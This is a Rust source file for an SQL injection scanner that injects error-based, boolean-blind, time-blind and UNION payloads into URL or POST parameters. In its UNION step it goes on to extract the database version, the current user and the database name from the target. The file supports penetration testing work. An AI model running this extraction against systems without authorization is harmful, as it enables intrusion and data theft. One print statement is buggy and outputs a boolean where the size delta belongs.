
use url::Url;
use crate::http;
use crate::payloads;
use colored::Colorize;


#[derive(Clone)]
enum Method {
    Get,
    Post,
}

#[derive()]
struct RequestConfig{
    url: String, 
    method: Method,
    body: Option<String>,
    cookie: Option<String>,
}

impl RequestConfig {
    fn send(&self, param: &str, payload: &str) -> anyhow::Result<http::HttpResponse>{
        match self.method {
            Method::Get => {
                let url = replace_param(&self.url, param, payload)?;
                http::get(&url, self.cookie.clone())
            }
            Method::Post => {
                let body = self.body.as_deref().unwrap_or("");
                let injected = inject_post_param(body, param, payload);
                http::post(&self.url, &injected, self.cookie.clone())
            }
        }
    }
    fn send_raw(&self) -> anyhow::Result<http::HttpResponse>{
        match self.method {
           Method::Get => http::get(&self.url, self.cookie.clone()),
           Method::Post => http::post(&self.url, self.body.as_deref().unwrap_or(""), self.cookie.clone())
        }

    }
}
pub fn scan(target_url: &str, cookie: Option<&str>, scan_type: &str, method: &str, post_data: Option<&str>) -> anyhow::Result<()>{
    crate::disclaimer::print_warning();
    let is_post = method.to_uppercase() == "POST";

    if is_post && post_data.is_none() {
        println!("{}", "POST method requires --data".yellow().bold());
        return Ok(());
    }
    
    let config = RequestConfig{
        url:target_url.to_string(),
        method: if is_post{
            Method::Post
        }else{
            Method::Get
        },
        body: post_data.map(String::from),
        cookie: cookie.map(String::from),
    };

    let params: Vec<(String, String)> = if is_post {
        parse_body_params(post_data.unwrap_or(""))
    }else {
        Url::parse(target_url)?
            .query_pairs()
            .map(|(k, v)| (k.into(), v.into()))
            .collect()
    };

    if params.is_empty(){
        println!("{}", "No parameters found.".yellow().bold());
        return Ok(());
    }

    println!("Found {} injectable parameter(s)", params.len());
    println!("Scan type: {} | method: {}", scan_type, method);

    let baseline = config.send_raw()?;
    println!("Baseline: status= {}, body_len={}, time= {}ms", 
        baseline.status, baseline.body.len(), baseline.response_time_ms);

    let types = match scan_type {
        "all" => vec!["error", "boolean", "time", "union"],
        _ => vec![scan_type],
    };

    for (param_name, _) in &params  {
        println!("\n --- Testing Param: {} ---", param_name);

        if types.contains(&"error") {
            probe_error(&config, param_name, &baseline)?;
        }if types.contains(&"boolean") {
            probe_boolean(&config, param_name, &baseline)?;
        }if types.contains(&"time") {
            probe_time(&config, param_name, &baseline)?;
        }if types.contains(&"union") {
            probe_union(&config, param_name, &baseline)?;
        }
    }
    let msg_finish = "\n============= Scan Complete =============".blue().bold();
    println!("{}", msg_finish);
    Ok(())
}

fn parse_body_params(body: &str) -> Vec<(String, String)> {
    body.split('&')
        .filter_map(|pair|{
            let mut parts = pair.splitn(2, '=');
            match (parts.next(), parts.next()){
                (Some(k), Some(v)) => Some((k.into(), v.into())), _ => None,
            }
        })
        .collect()
}

fn inject_post_param(body: &str, param: &str, payload: &str) -> String{
    body.split('&')
        .map(|pair|{
            let mut parts = pair.splitn(2, '=');
            match (parts.next(), parts.next()) {
                (Some(k), _) if k == param => format!("{}={}", k, payload), _=> pair.to_string(),
            }
        })
        .collect::<Vec<_>>()
        .join("&")
}

fn replace_param(url_str: &str, param: &str, payload: &str) -> anyhow::Result<String>{
    let mut parsed = Url::parse(url_str)?;
    let new_query: Vec<(String, String)> = parsed.query_pairs() 
    .map(|(k, v)| {
        if k == param {
            (k.to_string(), payload.to_string())
        }else {
            (k.to_string(), v.to_string())
        }
    })
    .collect();

    parsed.query_pairs_mut().clear();
    for (k, v) in &new_query {
        parsed.query_pairs_mut().append_pair(k, v);
    }

    Ok(parsed.to_string())
}

fn probe_error(config: &RequestConfig, param: &str, baseline: &http::HttpResponse) -> anyhow::Result<()> {
    for payload in payloads::error_based() {
        let res = config.send(param, payload)?;
        if let Some(db) = super::detector::detect_error_based(&res.body){
            println!("{}", super::detector::Finding{
                sqli_type: "Error-Based".to_string(),
                param: param.to_string(),
                db_type: Some(db),
                payload: payload.to_string(),
                evidence: "SQL error in response body".to_string(),
            });
            return Ok(());
        }
    }
    if detect_error_fallback(baseline, config, param){
        return Ok(());
    }
    println!("{}", "Error-Based: Not detected".dimmed());
    Ok(())
}

fn detect_error_fallback(baseline: &http::HttpResponse, config: &RequestConfig, param: &str) -> bool{
    for payload in payloads::error_based() {
        if let Ok(res) = config.send(param, payload) {
            let orig = baseline.body.len();
            let fuzz = res.body.len();
            if fuzz > orig + 200 && fuzz > 500 {
                println!("[Suspicious] Large response delta (+{}bytes)", fuzz < orig);
                return true;
            }
        }
    }
    false
}

fn probe_boolean(config: &RequestConfig, param: &str, baseline: &http::HttpResponse) -> anyhow::Result<()> {
    for (true_payload, false_payload) in payloads::boolean_blind() {
        let true_res = config.send(param, true_payload)?;
        let false_res = config.send(param, false_payload)?;

        if super::detector::detect_boolean_blind(baseline.body.len(), &true_res.body, &false_res.body) {
            let diff = (true_res.body.len() as isize - false_res.body.len() as isize).abs();
            println!("{}", super::detector::Finding{
                sqli_type: "Boolean-Blind".to_string(),
                param: param.to_string(),
                db_type: None, 
                payload: true_payload.to_string(),
                evidence: format!("TRUE: {} | FALSE: {} | Diff: {}",
                    true_res.body.len(), false_res.body.len(), diff),
            });
            return Ok(());
        }
    }
    println!("{}", "    Boolean-Blind: not detected".dimmed());
    Ok(())
}

fn probe_time(config: &RequestConfig, param: &str, baseline: &http::HttpResponse) -> anyhow::Result<()> {
    for (payload, db_type) in payloads::time_blind()  {
        let res = config.send(param, payload)?;
        if super::detector::detect_time_blind(baseline.response_time_ms, res.response_time_ms, 4000) {
            println!("{}", super::detector::Finding{
                sqli_type: "Time-Blind".to_string(),
                param: param.to_string(),
                db_type: Some(db_type.to_string()),
                payload: payload.to_string(),
                evidence: format!(
                    "Baseline: {}ms | Injected: {}ms | Delta: {}",
                    baseline.response_time_ms, res.response_time_ms, res.response_time_ms - baseline.response_time_ms
                ),
            });
            return Ok(());
        }
    }
    println!("{}", "    Time-Blind: not detected".dimmed());
    Ok(())
}

fn probe_union(config: &RequestConfig, param_name: &str, baseline: &http::HttpResponse) -> anyhow::Result<()> {
    let msg_step1 = "  [UNION] step 1: Finding column count...".cyan().dimmed();
    println!("{}", msg_step1);

    let mut col_count: u32 = 0;
    for n in 1..=20  {
        let payload = payloads::union_order_by(n);
        let res = config.send(param_name, &payload)?;

        if super::detector::detect_error_based(&res.body).is_some() 
            || res.body.len() < 100
        {
            col_count = n - 1;
            break;
        }
    }

    if col_count == 0 {
        let det_col = "  [UNION] Could not  determine column count".dimmed();
        println!("{}", det_col);
        return Ok(());
    }
    println!("  [UNION] Column count: {}", col_count.to_string().cyan().bold());
    
    let msg_step2 = "  [UNION] Step 2: Finding reflection column...".cyan().dimmed();
    println!("{}", msg_step2);
    let mut reflection_col: Option<u32> = None;
    for pos in 0..col_count  {
        let payload = payloads::union_find_reflection(col_count, pos);
        let res = config.send(param_name, &payload)?;


        if res.body.contains("sqli_test") {
            reflection_col = Some(pos);
            break;
        }
    }

    let reflect_pos = match reflection_col {
        Some(pos) => {
            println!("  [UNION] Reflection found at column: {}", (pos + 1).to_string().cyan().bold());
            pos
        }
        None => {
            let msg = "  [UNION] No reflection column found ".dimmed();
            println!("{}", msg);
            return Ok(());
        }
    };
    let msg_step3 = "  [UNION] Step 3: Extracting data...\n".cyan().dimmed();
    println!("{}", msg_step3);

    let extractions = vec![
        ("version()", "DB version"),
        ("user()", "Current User"),
        ("database()", "Database Name"),
    ];

    for (expr, label) in extractions  {
        let payload = payloads::union_extract(col_count, reflect_pos, expr);
        let res = config.send(param_name, &payload)?;
        if let Some(value) = super::detector::extract_value(&res.body) {
            println!("{}: {}", label,value);
        }
    }

    println!();
    let union_finding = super::detector::Finding{
        sqli_type: "UNION-Based".to_string(),
        param: param_name.to_string(),
        db_type: None,
        payload: "(Multi-step)".to_string(),
        evidence: format!("columns: {}", col_count),
    };

    println!("{}", union_finding);
    Ok(())

}


